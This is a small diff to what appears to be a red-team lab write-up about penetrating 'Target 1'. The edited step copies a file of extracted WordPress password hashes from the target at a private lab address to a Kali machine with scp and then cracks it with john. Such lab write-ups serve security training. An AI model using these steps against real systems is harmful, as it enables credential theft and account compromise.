@@ -97,8 +97,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - Crack password hashes with `john`.
 
         - If you extracted the usernames and hashes with `mysql` then you can move the new file to the Kali machine via `scp`
-          - `scp michael@192.168.1.110:/home/michael/users ./`
-          ![](./images/john2.png)
+          - `scp michael@192.168.1.110:/home/michael/wp_hashes.txt ./`
         
         - Next use `john` to crack the passwords
           - `john wp_hashes.txt`
